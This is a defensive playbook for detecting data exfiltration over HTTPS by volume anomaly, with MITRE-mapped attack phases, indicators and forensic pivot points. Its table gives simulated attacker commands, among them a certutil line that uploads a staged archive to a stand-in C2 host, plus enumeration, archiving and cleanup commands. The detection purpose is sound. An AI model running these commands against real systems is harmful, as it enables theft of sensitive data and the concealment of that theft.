# 📤 Data Exfiltration over HTTPS (Volume Anomaly) – T1041

**Explanation:** This playbook analyzes the final stage of an attack where sensitive data is transferred out of the network via an encrypted tunnel (**T1041, Exfiltration Over C2 Channel**). Because HTTPS (Port 443) is common and trusted, the most effective detection **Anchor Point** is the **Volume Anomaly**. This is characterized by an unexpected, high-volume data transfer (e.g., 50MB+) in a short period, originating from a process that is not a standard browser or cloud sync utility.

---

## 1. Attack Flow, IOCs, and Simulated Commands

| Phase | MITRE ID & Technique | Primary Investigative Focus (IOCs) | Simulated Attack Command (Payload) |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1566.001 (Phishing) | **File/Identity:** Compromised user opens malicious document. | (Macro/script runs initial loader) |
| **Execution/Discovery** | T1083 (File Discovery) | **Process:** High rate of file enumeration/read operations on sensitive directories. | `powershell.exe -c "Get-ChildItem -Path C:\Users\Target\Documents -Recurse | Select-Object FullName > C:\temp\files.txt"` |
| **Staging/Archiving** | T1560.001 (Archive via Utility) | **File:** Rapid creation of a large, compressed archive (`.zip`, `.7z`) in a temp directory. | `"C:\Program Files\7-Zip\7z.exe" a C:\temp\backup.7z C:\TargetData` |
| **Exfiltration (ANCHOR)** | **T1041 (Volume Anomaly)** | **Network:** Single, large outbound connection over **Port 443** from a suspicious process (`powershell.exe`, `svchost.exe` variant, or custom binary). | `certutil.exe -urlcache -f https://evil-c2-domain.com/upload/ -verb POST C:\temp\backup.7z` |
| **Impact** | T1565.001 (Data Destruction) | **File:** Deletion of the staging artifact after successful upload. | `cmd.exe /c del C:\temp\backup.7z` |

---

## 2. Key Forensic Artifacts (Data Pivot Points)

### High-Confidence Network & Process IOCs

1.  **Outbound Volume Spike:** The single highest-fidelity IOC is the network telemetry showing an **outbound transfer exceeding a defined threshold** (e.g., 50MB, 100MB) over **Port 443** within a 5-minute window.
2.  **Process Context Mismatch:** The source process for the large HTTPS transfer is *not* a standard application (`chrome.exe`, `msedge.exe`, `OneDrive.exe`). Look for unusual processes like `cmd.exe`, a service host process (`svchost.exe`) with a custom configuration, or an executable dropped in a temp path.
3.  **Target Endpoint:** The destination IP or domain is highly suspicious, either a known C2 infrastructure (IOC list) or a legitimate service (like a file-sharing site) used in an anomalous, scripted manner.

### File and System IOCs

1.  **Preceding File Creation:** Immediately prior to the network spike, file system logs must show the creation of a **large archive file** (`.zip`, `.rar`, `.7z`) that matches the size of the exfiltrated data.
2.  **Parent Process Tree:** Tracing the exfiltrating process back to its parent will often reveal the initial execution method (e.g., a macro, a LOLBIN, or a scheduled task).
3.  **Compromised Identity:** The user account executing the entire chain must be flagged, and all associated session tokens, VPN access, and credentials must be revoked immediately.
